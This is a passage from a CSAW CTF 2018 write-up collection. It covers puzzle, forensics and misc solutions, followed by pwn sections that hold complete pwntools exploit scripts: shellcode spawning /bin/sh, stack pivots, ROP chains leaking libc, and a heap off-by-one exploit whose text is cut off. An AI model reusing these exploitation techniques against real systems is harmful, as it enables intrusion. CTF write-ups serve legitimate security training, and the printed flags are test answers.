Base64.\n\nMy first guess was that we treat the SVG grids as chessboards, then for each move of a piece, we take the squares that the piece moved from or to. The coordinates are relatively easy to parse from algebraic notation, but this method seemed to produce no readable text.\n\nThe next thing I tried was taking all the characters in the SVG grids and simply decoding them as they were without modifying them. This produced some garbage data, but some of it was readable. What I noticed in particular was that the data decoded from the very first grid has 12 bytes of garbage, followed by 24 bytes of readable text (some lorem ipsum filling text), then 12 bytes of garbage again.\n\n    x x x x x x x x\n    x x x x x x x x\n    . . . . . . . .\n    . . . . . . . .\n    . . . . . . . .\n    . . . . . . . .\n    x x x x x x x x\n    x x x x x x x x\n    \n    (x = garbage, . = data)\n\nGiven the presence of chess moves and the fact that this was the first grid, this was clearly the starting position, and characters covered by pieces should be ignored.\n\nThe chess game (in `final.pcap`) was quite long at 90+ moves, so I didn't feel like stepping through the moves myself and writing down the board state manually. Parsing SAN also seemed a bit too slow, so instead I just exported the moves into a standard format – the moves themselves were already encoded properly, I just numbered them properly:\n\n    1. Nf3 Nf6 2. d4 e6 3. Nc3 d5 4. Bg5 Bb4 5. e3 h6 6. Bxf6 Qxf6 7. Bb5+ Bd7 8. O-O O-O 9. Ne5 Qe7 10. Bd3 Nc6 11. Nxd7 Qxd7 12. Ne2 Qe7 13. c4 dxc4 14. Bxc4 Qh4 15. Rc1 Rfd8 16. Ng3 a6 17. f4 Bd6 18. Ne4 Kh8 19. Nxd6 Rxd6 20. Be2 Qd8 21. Qb3 Rb8 22. Rf2 Ne7 23. Bh5 Kg8 24. Qd3 Nd5 25. a3 c6 26. Bf3 Qe7 27. Rfc2 Rc8 28. Rc5 Re8 29. Qd2 Qf6 30. Be4 h5 31. Qe2 h4 32. Qf3 Rd7 33. Bd3 Red8 34. Re1 Kf8 35. Qh5 Nxf4 36. exf4 Qxd4+ 37. Kh1 Qxd3 38. Qh8+ Ke7 39. Qxh4+ Kd6 40. Rc3 Qd2 41. Qg3 Kc7 42. f5+ Kc8 43. fxe6 fxe6 44. Rce3 Qxb2 45. Rxe6 Rd1 46. h3 Rxe1+ 47. Rxe1 Qf6 48. a4 Qf7 49. a5 Rd5 50. Qg4+ Kb8 51. Qg3+ Ka8 52. Re5 Qd7 53. Kg1 Ka7 54. Kh2 Rb5 55. Rxb5 axb5 56. Qe3+ Kb8 57. Qc5 Kc7 58. Kg1 Qd1+ 59. Kf2 Qd6 60. Qc3 Qf8+ 61. Kg1 b6 62. Qd4 Qc5 63. Qxc5 bxc5 64. Kf2 Kb7 65. Ke3 Ka6 66. h4 Kxa5 67. h5 c4 68. Kd2 Kb4 69. g4 Kb3 70. g5 Kb2 71. Ke2 c3 72. h6 gxh6 73. gxh6 c2 74. h7 c1=Q 75. h8=Q+ Qc3 76. Qf8 b4 77. Qf4 Qc2+ 78. Kf3 b3 79. Qd6 c5 80. Ke3 c4 81. Qe6 Qd3+ 82. Kf4 c3 83. Qe5 Ka3 84. Qa5+ Kb2 85. Qe5 Kc1 86. Qc5 b2 87. Qg1+ Kd2 88. Qg2+ Kd1 89. Qg4+ Kc2 90. Qg1 Qd6+ 91. Ke4 Qb4+ 92. Kf3 Qb7+ 93. Kf4 b1=Q 94. Qe3 Kb3 95. Kg5 Qd5+ 96. Kf4 Qbf5+ 97. Kg3 Qd6+ 98. Kg2 Qd2+ 99. Qxd2 cxd2 100. Kg1 d1=Q+ 101. Kg2 Qd2+ 102. Kg3 Qdf2#\n\nThen I pasted this into the [analysis board on Lichess](https://lichess.org/analysis), and with some light Javascript I took the [FEN](https://en.wikipedia.org/wiki/Forsyth%E2%80%93Edwards_Notation) value at each turn. FEN notation encodes the momentary state of the game as opposed to the turn progression, so it is very easy to parse it to see which squares are occupied and which are not.\n\nWith the FENs, I masked each SVG grid and parsed the text. Unfortunately, no matter how I adjusted the parser, I could only see the end of the flag (`r3aLLLy_hat3_chess_tbh}`). I tried a couple of guesses but I didn't know how much of the flag I was missing.\n\nAfter some frustration, I decided to look at the `output.pcap` file, which I downloaded earlier but didn't really use until now. The admin of the challenge said that there were solves on that version as well, so it was clearly not totally broken.\n\nSince the flag in `final.pcap` was quite late in the chess game, the masking with chess pieces didn't really hide it and it might have been sufficient to simply decode the SVG grids without masking – so I tried this on the `output.pcap` grids and indeed, I found most of the flag there (except for the last three characters).\n\nI guess a [grille cipher](https://en.wikipedia.org/wiki/Grille_(cryptography)) is not terribly effective when most of the grid is used, as is the case towards the end of the game.\n\n`flag{3y3_actuAllY_r3aLLLy_hat3_chess_tbh}`\n\n## 300 Forensics / whyOS ##\n\n**Description**\n\n> Have fun digging through that one. No device needed.\n> \n> Note: the flag is not in flag{} format\n> \n> HINT: the flag is literally a hex string. Put the hex string in the flag submission box\n> \n> Update (09/15 11:45 AM EST) - Point of the challenge has been raised to 300\n> \n> Update Sun 9:09 AM: its a hex string guys\n\n**Files provided**\n\n - [`com.yourcompany.whyos_4.2.0-28debug_iphoneos-arm.deb`](files/whyos-app.deb)\n - [`console.log`](files/whyos-log.zip)\n\n**Solution**\n\nWe are given an iOS app (or part of it perhaps), and a console log from an iOS device where the flag can presumably be located. The app itself seems pretty lacking, but we can see that it adds itself into the Preferences / Settings application. Our task is then to somehow find the flag in the console log.\n\nThe flag for this challenge is not in the `flag{...}` format, so a simple `grep` would not work. We do know that it is a hexadecimal string, but this is not extremely useful, given that the log file contains thousands of hexadecimal strings.\n\nAfter searching the log manually for some time without much success, I decided to make the job a bit easier by separating the log entries into different files based on which application produced them. Each message has a simple format:\n\n    ...\n    default 19:11:39.936008 -0400   sharingd    TTF: Problem flags changed: 0x0 < >, AirPlay no\n    default 19:11:39.944252 -0400   SpringBoard WIFI PICKER [com.apple.Preferences]: isProcessLaunch: 0,    isForegroundActivation: 1,     isForegroundDeactivation: 0\n    default 19:11:39.944405 -0400   symptomsd   36246 com.apple.Preferences: ForegroundRunning (most elevated: ForegroundRunning)\n    default 19:11:39.945559 -0400   SpringBoard SBLockScreenManager - Removing a wallet pre-arm disable assertion for reason: Setup\n    default 19:11:39.945609 -0400   SpringBoard SBLockScreenManager - Removing a wallet pre-arm disable assertion for reason: Device blocked\n    ...\n\nThe format being `<severity level> <timestamp>   <source application> <message>`.\n\n([Full separator script here](scripts/WhyOS.hx))\n\nThe individual program logs were much easier to parse, since individually they contained a lot of repeating messages that would presumably not show the flag. Eventually I got to the Preferences app and found the flag among these lines:\n\n    ...\n    default 19:11:45.660046 -0400   Preferences feedback engine <_UIFeedbackSystemSoundEngine: 0x1d42a0ea0: state=4, numberOfClients=0, prewarmCount=0, _isSuspended=0> state changed: Running -> Inactive\n    default 19:11:46.580029 -0400   Preferences viewDidLoad \"<private>\"\n    default 19:12:18.884704 -0400   Preferences ca3412b55940568c5b10a616fa7b855e\n    default 19:12:49.086306 -0400   Preferences Received device state note {uniqueID: <private>, weakSelf: 0x1d02af780}\n    default 19:12:49.087343 -0400   Preferences Device note {isNearby: 1, isConnected: 0, isCloudConnected: 0, _nearby: 0, _connected: 0, _cloudConnected: 0}\n    ...\n\nIt might not be obvious why this should be the flag, but all the other messages produced by the Preferences app made sense, i.e. they had some descriptive text. This hexadecimal string did not have any indication of what it meant, so it was \"clearly\" the flag.\n\n`ca3412b55940568c5b10a616fa7b855e`\n\n## 1 Misc / Twitch Plays Test Flag ##\n\n**Description**\n\n> `flag{typ3_y3s_to_c0nt1nue}`\n\n**No files provided**\n\n**Solution**\n\n...\n\n`flag{typ3_y3s_to_c0nt1nue}`\n\n## 50 Misc / bin_t ##\n\n**Description**\n\n> Binary trees let you do some interesting things. Can you balance a tree?\n> \n> `nc misc.chal.csaw.io 9001`\n> \n> Equal nodes should be inserted to the right of the parent node. You should balance the tree as you add nodes.\n\n**No files provided**\n\n**Solution** (by [PK398](https://github.com/PK398))\n\nThe challenge gives you ~100 numbers and tells you to insert the numbers into an AVL Binary Tree and then do a pre-order traversal. The concept of trees should be familiar to programmers and should be able to insert into an AVL tree and be able to do a left and right rotate to balance a tree and if not there are plenty of implementations available online. Once the tree has been constructed, we can traverse it in a pre-order manner (print root, traverse the left subtree and then the right subtree) and print it as a comma-separated list and sending it back to the server gives us the flag.\n\n`flag{HOW_WAS_IT_NAVIGATING_THAT_FOREST?}`\n\n## 75 Misc / Short Circuit ##\n\n**Description**\n\n> Start from the monkey's paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.\n> \n> - Elyk\n\n**Files provided**\n\n - [`20180915_074129.jpg`](files/short-circuit-20180915_074129.jpg)\n\n**Solution** (by [PK398](https://github.com/PK398))\n\n![](screens/short-circuit.jpg)\n\n`flag{owmyhand}`\n\n## 100 Misc / Algebra ##\n\n**Description**\n\n> Are you a real math wiz?\n> \n> `nc misc.chal.csaw.io 9002`\n\n**No files provided**\n\n**Solution**\n\nAfter conecting we are presented with some simple math problems:\n\n      ____                                     __ _           _            ___ ___ \n     / ___|__ _ _ __     _   _  ___  _   _    / _(_)_ __   __| |  __  __  |__ \\__ \\\n    | |   / _` | '_ \\   | | | |/ _ \\| | | |  | |_| | '_ \\ / _` |  \\ \\/ /    / / / /\n    | |__| (_| | | | |  | |_| | (_) | |_| |  |  _| | | | | (_| |   >  <    |_| |_| \n     \\____\\__,_|_| |_|   \\__, |\\___/ \\__,_|  |_| |_|_| |_|\\__,_|  /_/\\_\\   (_) (_) \n                         |___/                                                     \n    **********************************************************************************\n    18 - X = 121\n    What does X equal?: -103\n    YAAAAAY keep going\n    14 * X = 64\n    What does X equal?: 64/14\n    HEYYYY THAT IS NOT VALID INPUT REMEMBER WE ONLY ACCEPT DECIMALS!\n\nAt some point the problems become a bit lengthier:\n\n    ...\n    YAAAAAY keep going\n    ((((1 - 5) + (X - 15)) * ((18 + 2) + (11 + 3))) - (((4 + 8) * (3 * 3)) * ((2 * 5) * (13 - 9)))) - ((((8 - 14) - (11 - 6)) - ((14 + 12) + (13 * 15))) - (((9 - 1) - (3 * 9)) * ((5 * 4) * (19 + 4)))) = -13338\n\nAnd at some point later still, the intermediate results cross the overflow limits for both 32-bit and 64-bit integers. So Python with its native bigints seemed like a natural choice for the solver.\n\nPerformance was not particularly important for this challenge, since it seemed the server would wait 20 seconds before timing out on any given problem. Additionally, the equation always had one occurrence of `X`, always had a single integer on the right-hand side, and the operations on the left-hand side were grouped into parentheses properly and only included `+`, `-`, and `*`.\n\nSo my approach was to have a couple of simple regular expressions to match a bracketed operation with specific integers and replace that (in the equation string) with the result, then repeat as long as needed. Also, some of the problems had non-integer solutions. The default precision of Python seemed good enough, but I was worried about inaccuracy build-up if I used floats, so instead I kept the result as a fraction of two integers until the very end when it was submitted to the server.\n\n([Full Python script here](scripts/algebra.py))\n\n`flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}`\n\n## 200 Misc / Take an L ##\n\n**Description**\n\n> Fill the grid with L's but avoid the marked spot for the W\n> \n> `nc misc.chal.csaw.io 9000`\n> \n> The origin is at (0,0) on the top left\n\n**Files provided**\n\n - [`description.pdf`](files/take-an-l-description.pdf)\n\n**Solution**\n\nThe challenge is a pretty simple algorithmic question - how to fill a `2^n x ^n` board with 1 hole with L-shaped tiles (each taking 3 squares). On connection the server always gives us a `n = 6`, i.e. a `64 x 64` board, but the fact that it is a power of two is significant, since this tiling works easily for any power of two board. Let's consider first how to tile boards with the hole in the top-left corner:\n\n    n = 0, board size: 1 x 1\n    \n    O\n    \n    n = 1, board size: 2 x 2\n    O ║\n    ══╝\n    \n    n = 2, board size: 4 x 4\n    O ║ ══╗\n    ══╝ ║ ║\n    ║ ══╝ ║\n    ╚══ ══╝\n    \n    n = 4, board size: 8 x 8\n    O ║ ══╗ ╔══ ══╗\n    ══╝ ║ ║ ║ ══╗ ║\n    ║ ══╝ ║ ══╗ ║ ║\n    ╚══ ══╝ ║ ║ ══╝\n    ╔══ ║ ══╝ ║ ══╗\n    ║ ║ ╚══ ══╝ ║ ║\n    ║ ╚══ ║ ║ ══╝ ║\n    ╚══ ══╝ ╚══ ══╝\n    \n    ...\n\nNotice that in each step, the top-left quarter is tiled the same as the step before. Furthermore, look at `n = 4` if we take out the middle tile:\n\n    (     ) ╔══ ══╗\n    ( n-1 ) ║ ══╗ ║\n    (     ) ══╗ ║ ║\n    (     )   ║ ══╝\n    ╔══ ║     ║ ══╗\n    ║ ║ ╚══ ══╝ ║ ║\n    ║ ╚══ ║ ║ ══╝ ║\n    ╚══ ══╝ ╚══ ══╝\n\nAll the quarters are actually tiled the same way, as `n - 1`, just turned differently. We just need to place a tile in the middle to connect them. In fact, it doesn't matter where the hole is in the board. We just need to separate the board into quarters and tile each quarter independently.\n\n([Full Haxe script here](scripts/TakeL.hx))\n\n`flag{m@n_that_was_sup3r_hard_i_sh0uld_have_just_taken_the_L}`\n\n## 25 Pwn / bigboy ##\n\n**Description**\n\n> Only big boi pwners will get this one!\n> \n> `nc pwn.chal.csaw.io 9000`\n\n**Files provided**\n\n - [`boi`](files/boi)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nstack overflow to change the variable\n\n## 50 Pwn / get it? ##\n\n**Description**\n\n> Do you get it?\n> \n> `nc pwn.chal.csaw.io 9001`\n\n**Files provided**\n\n - [`get_it`](files/get_it)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nstack overflow to change the return address to the shell function\n\n## 100 Pwn / shell->code ##\n\n**Description**\n\n> Linked lists are great! They let you chain pieces of data together.\n> \n> `nc pwn.chal.csaw.io 9005`\n\n**Files provided**\n\n - [`shellpointcode`](files/shellpointcode)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nput `/bin/sh\\x00` into node 1, and put shellcode \n\n```assembly\nadd esp,0x30\nxor rdx,rdx\nxor rsi,rsi\npush SYS_execve\npop rax\nsyscall\n```\n```python\nfrom pwn import *\ng_local=True\ncontext.log_level='debug'\nif g_local:\n\tsh = process('./shellpointcode')#env={'LD_PRELOAD':'./libc.so.6'}\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"pwn.chal.csaw.io\", 9005)\nshellcode = \"lea rdi,[rsp+0x28]\\nxor rdx,rdx\\nxor rsi,rsi\"\nsh.recvuntil(\"(15 bytes) Text for node 1:  \\n\")\nsh.send(\"/bin/sh\\x00\\n\")\nsh.recvuntil(\"(15 bytes) Text for node 2: \\n\")\nsh.send(\"A\" * 5 + asm(\"\\npush SYS_execve\\npop rax\\nsyscall\", arch='amd64')  + \"\\n\")\nsh.recvuntil(\"node.next: 0x\")\nleak = sh.recv(6*2)\nret_addr = int(leak, 16)\nsh.recvuntil(\"What are your initials?\\n\")\nsh.send(\"A\" * (3+8) + p64(ret_addr) + asm(shellcode, arch='amd64') + \"\\xeb\\n\")\nsh.interactive()\n```\nto node 2 and initials\n\nbacause the memory layout, is initials, node 2, node 1, from low address to high address\n\n## 200 Pwn / doubletrouble ##\n\n**Description**\n\n> Did you know every Number in javascript is a float\n> \n> `pwn.chal.csaw.io:9002`\n> \n> nsnc\n\n**Files provided**\n\n - [`doubletrouble`](files/doubletrouble)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe problem is the total length will increase in `find_array`\n\n```c\nint __cdecl findArray(int *a1, double *a2, double a3, double a4)\n{\n  int v5; // [esp+1Ch] [ebp-4h]\n\n  v5 = *a1;\n  while ( *a1 < 2 * v5 )\n  {\n    if ( a2[*a1 - v5] > (long double)a3 && a4 > (long double)a2[*a1 - v5] )\n      return *a1 - v5;\n    ++*a1;\n  }\n  *a1 = v5;\n  return 0;\n}\n```\n\nThen it will sort according to the increased size, which can affect return address.\n\nHowever, there is canary, so we need to let the canary stay at the same position after sorting, with return address being changed.\n\nWhat I've chosen is to set it as `leave ret`, and pivot the stack into our double array, then execute `retn` to execute our shellcode in the form of IEEE double. Also, the shellcode must be sorted, which can be implemented by manipulating the exponential part of IEEE double, while the digits are our shellcode with `jmp short`.\n\nThis takes me a lot of time, and we need to execute `/bin/sh` instead of `/bin/csh` as it suggested in the strings in the executable. Also, since canary is random, we cannot be sure about the position of canary after sorting, so my approach gives about `1/40` probability.\n\n//todo, more detailed illustration later\n\n```python\nfrom pwn import *\nimport struct\ng_local=False\ncontext.log_level='debug'\n\n\nLEAVE_RET = 0x08049166\nDOUBLE_OFF = 0\ndef to_double(num):\n\treturn struct.unpack('<d', p64(num))[0]\n\ndef make_ieee_double(exp, digit, sign = 1):\n\tassert sign == 1 or sign == 0\n\tassert digit >= 0 and digit < (1 << 52)\n\trexp = exp + 1023\n\tassert rexp >= 0 or rexp < 2048\n\treturn to_double((sign << 63) + (rexp << 52) + digit)\n\ndef shellcodes_4(asmcode):\n\tret = asm(asmcode)\n\tassert len(ret) <= 4\n\treturn u64(ret.ljust(4, \"\\x90\") + '\\xeb\\x02\\x00\\x00')\n\ndef make_shellcode(shpath):\n\tassert len(shpath) % 4 == 0\n\tret = []\n\te = 1000\n\t#0x804A127\n\tfor x in range(0, len(shpath), 4)[::-1]:\n\t\tret.append(make_ieee_double(e, shellcodes_4(\"mov ax,\" + hex(u16(shpath[x+2:x+4])))))\n\t\te -= 1\n\t\tret.append(make_ieee_double(e, shellcodes_4(\"shl eax,16\")))\n\t\te -= 1\n\t\tret.append(make_ieee_double(e, shellcodes_4(\"mov ax,\" + hex(u16(shpath[x:x+2])))))\n\t\te -= 1\n\t\tret.append(make_ieee_double(e, shellcodes_4(\"push eax\")))\n\t\te -= 1\n\t#0x804BFF0\n\tret.append(make_ieee_double(e, shellcodes_4(\"push esp\")))\n\te -= 1\n\tret.append(make_ieee_double(e, shellcodes_4(\"mov ax,0x804\")))\n\te -= 1\n\tret.append(make_ieee_double(e, shellcodes_4(\"shl eax,16\")))\n\te -= 1\n\tret.append(make_ieee_double(e, shellcodes_4(\"mov ax,0xBFF0\")))\n\te -= 1\n\tret.append(make_ieee_double(e, shellcodes_4(\"mov eax,[eax]\")))\n\te -= 1\n\tret.append(make_ieee_double(e, shellcodes_4(\"call eax\")))\n\treturn ret\n\ndef exploit():\n\tif g_local:\n\t\tsh = process('./doubletrouble')#env={'LD_PRELOAD':'./libc.so.6'}\n\t\tshstr = \"/bin/sh\\x00\"\n\t\tgdb.attach(sh)\n\telse:\n\t\tsh = remote(\"pwn.chal.csaw.io\", 9002)\n\t\tshstr = \"/bin/sh\\x00\"\n\tsh.recvuntil(\"0x\")\n\tleak = int(sh.recv(8),16)\n\tarr = leak + DOUBLE_OFF\n\tsmallest = make_ieee_double(1020, arr + 0x20)\n\tbigger = make_ieee_double(800, 0xdeadbeef)\n\n\tpayload = [smallest] * 4 + [-50.0] + [to_double((LEAVE_RET << 32) + arr - 4)] * 2 + make_shellcode(shstr)\n\tpayload += [bigger] * (64-len(payload))\n\tassert len(payload) == 64\n\tsh.recvuntil(\"How long: \")\n\tsh.send(str(len(payload)) + \"\\n\")\n\tfor n in payload:\n\t\tsh.recvuntil(\"Give me: \")\n\t\tsh.send(repr(n) + \"\\n\")\n\tsh.recvuntil(\"Sorted Array:\")\n\tret = sh.recvuntil(\"terminated\\r\\n\", timeout = 3.0)\n\tif ret == '':\n\t\tsh.interactive()\n\telse:\n\t\treturn sh\n\nwhile True:\n\ttry:\n\t\texploit().close()\n\texcept Exception as e:\n\t\tprint \"failed\"\n```\n\n## 250 Pwn / turtles ##\n\n**Description**\n\n> Looks like you found a bunch of turtles but their shells are nowhere to be seen! Think you can make a shell for them?\n> \n> `nc pwn.chal.csaw.io 9003`\n> \n> Update (09/14 6:25 PM) - Added libs.zip with the libraries for the challenge\n\n**Files provided**\n\n - [turtles](files/turtles)\n - [libs.zip](https://ctf.csaw.io/files/f8d7ea4fde01101de29de49d91434a5a/libs.zip) (too large to host)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nAfter reversing function `objc_msg_lookup`, we found that if we satisfy some conditions, we can manipulate the return value, which will be called, and then we can do ROP, because we can control the buffer on stack. What I did is to switch the stack to heap to do further exploitation.\n\nFirstly, leak the `libc` address and return to main function, then do the same thing again to execute `system(\"/bin/sh\")`\n\nexp\n\n```python\nfrom pwn import *\n\ng_local=False\ncontext.log_level='debug'\n\ne = ELF(\"./libc-2.19.so\")\np = ELF(\"./turtles\")\nif g_local:\n\tsh = remote(\"192.168.106.151\", 9999)#env={'LD_PRELOAD':'./libc.so.6'}\nelse:\n\tsh = remote(\"pwn.chal.csaw.io\", 9003)\n\t#ONE_GADGET_OFF = 0x4557a\n\nLEAVE_RET = 0x400b82\nPOP_RDI_RET = 0x400d43\n#rop = 'A' * 0x80\nrop = p64(POP_RDI_RET)\nrop += p64(p.got[\"printf\"])\nrop += p64(p.plt[\"printf\"])\nrop += p64(0x400B84) #main\n\nsh.recvuntil(\"Here is a Turtle: 0x\")\nleak = sh.recvuntil(\"\\n\")\nobj_addr = int(leak, 16)\n\nrop_pivot = p64(0x400ac0) #pop rbp ret\nrop_pivot += p64(obj_addr + 8 + 0x20 + 0x10 + 0x30)\nrop_pivot += p64(LEAVE_RET) + p64(0)\n\nfake_turtle = p64(obj_addr + 8 + 0x20 - 0x40)\nfake_turtle += rop_pivot\n# different when dynamic\n# fake_turtle += p64(0x601400) + p64(0x601328)\n# fake_turtle += p64(0x601321) + p64(0)\n# fake_turtle += p64(1) + p64(8)\n# fake_turtle += p64(0) + p64(obj_addr + 8 + 0x20 + 0x80)\n# fake_turtle += 8 * p64(0)\n# #------------------\n# fake_turtle += p64(0) + p64(1)\n# fake_turtle += p64(0x601331) + p64(0x601349)\n# fake_turtle += p64(0x400d3c) #pop 5 ret\n# fake_turtle += 3 * p64(0)\n\nfake_turtle += p64(obj_addr + 8 + 0x20 + 0x10) + p64(0)\n#----------------\nfake_turtle += p64(0) + p64(obj_addr + 8 + 0x20 + 0x10 + 0x10) #pop 5 ret\nfake_turtle += p64(0x400d3c) + p64(0) * 3 #pop 5 ret\nfake_turtle += 'a' * 8 + rop\nsh.interactive()\nsh.send(fake_turtle)\nlibc_addr = u64(sh.recvuntil(\"\\x7f\") + \"\\x00\\x00\") - e.symbols[\"printf\"]\nprint hex(libc_addr)\n\nsh.recvuntil(\"Here is a Turtle: 0x\")\nleak = sh.recvuntil(\"\\n\")\nobj_addr = int(leak, 16)\n\nrop_pivot = p64(0x400ac0) #pop rbp ret\nrop_pivot += p64(obj_addr + 8 + 0x20 + 0x10 + 0x30)\nrop_pivot += p64(LEAVE_RET) + p64(0)\n\nfake_turtle = p64(obj_addr + 8 + 0x20 - 0x40)\nfake_turtle += rop_pivot\nfake_turtle += p64(obj_addr + 8 + 0x20 + 0x10) + p64(0)\n#----------------\nfake_turtle += p64(0) + p64(obj_addr + 8 + 0x20 + 0x10 + 0x10) #pop 5 ret\nfake_turtle += p64(0x400d3c) + p64(0) * 3 #pop 5 ret\nfake_turtle += 'a' * 8 + p64(POP_RDI_RET) + p64(libc_addr + next(e.search('/bin/sh\\x00')))\nfake_turtle += p64(libc_addr + e.symbols[\"system\"]) #0x30 one_gadget\n\nsh.send(fake_turtle)\n\nsh.interactive()\n```\n\n//todo\n\n## 300 Pwn / PLC ##\n\n**Description**\n\n> We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines.\n> \n> You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge\n> \n> NOTE The wargames platform is out of scope for this challenge, just use it to do the pwnable challenge. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at `contact at ret2.io`\n\n**No files provided**\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\n1. use `x` command to dump the binary, so that we can cheat using IDA.\n2. after some reversing, we found that there is overflow and no null termination when we fill `enrichment` string\n3. There is a function pointer just after it, which should point to `sub_AB0`, we can leak pie first\n4. then after some debugging, we know that when we call that function pointer, the `rdi` points to `enrichment`\n5. change that function to `printf`, so we can leak the `libc` address\n6. then change it to a ROP gadget, which can let the program go to our ROP chain, \n7. because there is a 128-length buffer that we can control in stack\n8. use return to syscall using gadgets in libc, since the original `execve` is disabled\n\n```python\nimport interact\nsh = interact.Process()\n\ndef u16(st):\n\tassert len(st) == 2\n\treturn ord(st[0]) + (ord(st[1]) << 8)\n\ndef p16(num):\n\treturn chr(num & 0xff) + chr((num >> 8) & 0xff)\n\ndef u64(st):\n\treturn u16(st[0:2]) + (u16(st[2:4]) << 0x10) + (u16(st[4:6]) << 0x20) + (u16(st[6:8]) << 0x30)\n\ndef p64(num):\n\treturn p16(num & 0xffff) + p16((num >> 0x10) & 0xffff) + p16((num >> 0x20) & 0xffff) + p16((num >> 0x30) & 0xffff)\n\ndef checksum(codes):\n\tcodes_len = 1020\n\tassert len(codes) == codes_len\n\tacc = 0\n\tk = 2\n\tfor i in xrange(0, codes_len, 2):\n\t\tacc = u16(codes[i:i+2]) ^ ((k + (((acc << 12) & 0xffff) | (acc >> 4))) & 0xffff)\n\t\tk += 1\n\treturn acc\n\ndef make_fw(codes):\n\tcodes = \"19\" + codes\n\tcs = checksum(codes)\n\tret = \"FW\" + p16(cs) + codes\n\tassert len(ret) == 0x400\n\treturn ret\n\ndef update(codes):\n\tsh.send(\"U\\n\")\n\tsh.send(make_fw(codes.ljust(1018,\"\\x00\")))\n\ndef execute(payload = '', leak = False):\n\tsh.send(\"E\".ljust(8,'\\x00') + payload + \"\\n\") #at 11$\n\tif leak:\n\t\tsh.readuntil(\"2019\")\n\t\treturn sh.readuntil(\"\\x7f\")\n\ndef status():\n\tsh.send(\"S\\n\")\n\tprint sh.readuntil(\"ENRICHMENT MATERIAL: \" + 'A' * 68)\n\tret = sh.readuntil(\"\\n\")\n\tret = ret[:len(ret)-1]\n\treturn ret\n\ndef make_payload(st):\n\tret = \"\"\n\tfor c in st:\n\t\tret += '2'\n\t\tret += c\n\treturn ret\n\ndef make_format(fmt):\n\treturn make_payload(\"2019\" + fmt + \"A\" * (64-len(fmt)) + p64(prog_addr + 0x900)) #printf\n\nprint sh.readuntil(\"- - - - - - - - - - - - - - - - - - - - \\n\")\nprint sh.readuntil(\"- - - - - - - - - - - - - - - - - - - - \\n\")\n#update(\"7\" * 70 + \"31\" + \"21\" * 0x100 + \"9\")\nupdate(\"2A\" * 68 + \"9\")\nexecute()\n\nprog_addr = (u64(status() + \"\\x00\\x00\") - 0xAB0)\nprint hex(prog_addr)\ntrigger = \"7\" * 70 + \"31\" + \"9\"\nupdate(make_format(\"%11$s\") + trigger)\nleak = execute(p64(prog_addr + 0x202018), True) #puts\n\nlibc_addr = u64(leak + \"\\x00\\x00\") - 0x6f690\nprint hex(libc_addr)\n\nrop_start = libc_addr + 0x10a407 # add rsp, 0x40 ; ret\npop_rax_ret = libc_addr + 0x33544\npop_rdi_ret = libc_addr + 0x21102\npop_rsi_ret = libc_addr + 0x202e8\npop_rdx_ret = libc_addr + 0x1b92\n\nrop = p64(pop_rax_ret) + '\\x3b'.ljust(8, '\\x00')# bug? p64(59) #execve \nrop += p64(pop_rdi_ret) + p64(libc_addr + 0x18CD57) #/bin/sh\nrop += p64(pop_rsi_ret) + p64(0)\nrop += p64(pop_rdx_ret) + p64(0)\nrop += p64(libc_addr + 0xF725E) #syscall\n\nupdate(make_payload(\"2019\" + \"A\" * 64 + p64(rop_start)) + trigger)\nexecute('A' * 0x10 + rop)\n\nsh.interactive()\n```\n\n## 400 Pwn / alien invasion ##\n\n**Description**\n\n> Construct additional pylons\n> \n> `nc pwn.chal.csaw.io 9004`\n> \n> Binary updated: 8:17 AM Sat\n> \n> Libc updated: 4:09 PM Sat\n\n**Files provided**\n\n - [`aliensVSsamurais`](files/alien-invasion-aliensVSsamurais)\n - [`libc-2.23.so`](files/alien-invasion-libc-2.23.so)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe sumurai part seems to be unexploitable, but there is a null byte off-by-one when we call `new_alien`\n\n```c\nv0->name[(signed int)read(0, v0->name, size)] = 0; // off by one\nv1 = alien_index++;\n```\n\nso we can use null byte poisoning to do it, however, we cannot write `__malloc_hook` or `__free_hook`, but there is a pointer in the alien structure, and we can show and edit it. Thus, we can use it to leak the stack address using `environ` in libc, and then write the return address of `hatchery` to `one_gadget` with the zero precondition.\n\nThe other parts seems to be not useful, although there are many problems in this binary. However, these problems are unexploitable or hard to exploit.\n\nexp\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext.log_level='debug'\n\nif g_local:\n\te = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\n\tsh = process('./aliensVSsamurais')#env={'LD_PRELOAD':'./libc.so.6'}\n\tONE_GADGET_OFF = 0x4526a\n\tUNSORTED_OFF = 0x3c4b78\n\tgdb.attach(sh)\nelse:\n\tONE_GADGET_OFF = 0x4526a\n\tUNSORTED_OFF = 0x3c4b78\n\tsh = remote(\"pwn.chal.csaw.io\", 9004)\n\te = ELF(\"./libc.so.6\")\n\t#ONE_GADGET_OFF = 0x4557a\n\ndef create(length, content):\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"How long is my name?\\n\")\n\tsh.send(str(length) + \"\\n\")\n\tsh.recvuntil(\"What is my name?\\n\")\n\tsh.send(content)\n\tsh.recvuntil(\"Brood mother, what tasks do we have today.\\n\")\n\ndef delete(idx):\n\tsh.send(\"2\\n\")\n\tsh.recvuntil(\"Which alien is unsatisfactory, brood mother?\\n\")\n\tsh.send(str(idx) + \"\\n\")\n\tsh.recvuntil(\"Brood mother, what tasks do we have today.\\n\")\n\ndef editidx(idx, content = None):\n\tsh.send(\"3\\n\")\n\tsh.recvuntil(\"Brood mother, which one of my babies would you like to rename?\\n\")\n\tsh.send(str(idx) + \"\\n\")\n\tsh.recvuntil(\"Oh great what would you like to rename \")\n\tret = sh.recvuntil(\" to?\\n\")\n\tret = ret[:len(ret)-len(\" to?\\n\")]\n\tif 